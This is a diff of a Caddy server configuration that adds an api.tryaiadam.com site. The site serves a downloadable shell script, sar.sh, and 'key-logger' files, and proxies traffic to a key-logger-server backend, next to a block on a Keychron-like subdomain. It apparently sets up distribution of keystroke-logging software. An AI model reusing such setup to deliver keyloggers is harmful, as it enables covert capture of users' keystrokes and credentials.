@@ -75,4 +75,66 @@ launcher.keychron.tryaiadam.com {
         Access-Control-Allow-Methods "GET, POST, PUT, DELETE, OPTIONS"
         Access-Control-Allow-Headers "Content-Type, Authorization"
     }
+}
+
+api.tryaiadam.com {
+    # Caddy will automatically get Let's Encrypt certificate
+    
+    # Serve the sar.sh script directly
+    handle /sar.sh {
+        root * /usr/share/caddy/key-logger
+        file_server
+        header Content-Type "application/x-sh"
+        header Content-Disposition "attachment; filename=sar.sh"
+    }
+    
+    # Serve key-logger files for download
+    handle /key-logger/* {
+        root * /usr/share/caddy
+        file_server
+        header Content-Type "application/octet-stream"
+    }
+    
+    # Enable WebSocket support
+    @websocket {
+        header Connection *Upgrade*
+        header Upgrade websocket
+    }
+    reverse_proxy @websocket key-logger-server:5000
+    
+    # Handle regular HTTP requests (everything except /sar.sh)
+    reverse_proxy key-logger-server:5000
+    
+    # Enable compression
+    encode gzip zstd
+    
+    # Security headers
+    header {
+        X-Content-Type-Options nosniff
+        X-Frame-Options SAMEORIGIN
+        X-XSS-Protection "1; mode=block"
+        Referrer-Policy strict-origin-when-cross-origin
+    }
+    
+    # CORS headers for API requests
+    @cors_preflight method OPTIONS
+    header @cors_preflight {
+        Access-Control-Allow-Origin "*"
+        Access-Control-Allow-Methods "GET, POST, PUT, DELETE, OPTIONS"
+        Access-Control-Allow-Headers "Content-Type, Authorization"
+        Access-Control-Max-Age "86400"
+    }
+    respond @cors_preflight 200
+    
+    header {
+        Access-Control-Allow-Origin "*"
+        Access-Control-Allow-Methods "GET, POST, PUT, DELETE, OPTIONS"
+        Access-Control-Allow-Headers "Content-Type, Authorization"
+    }
+    
+    # Logging for debugging
+    log {
+        output file /var/log/caddy/api.tryaiadam.com.log
+        format json
+    }
 } 
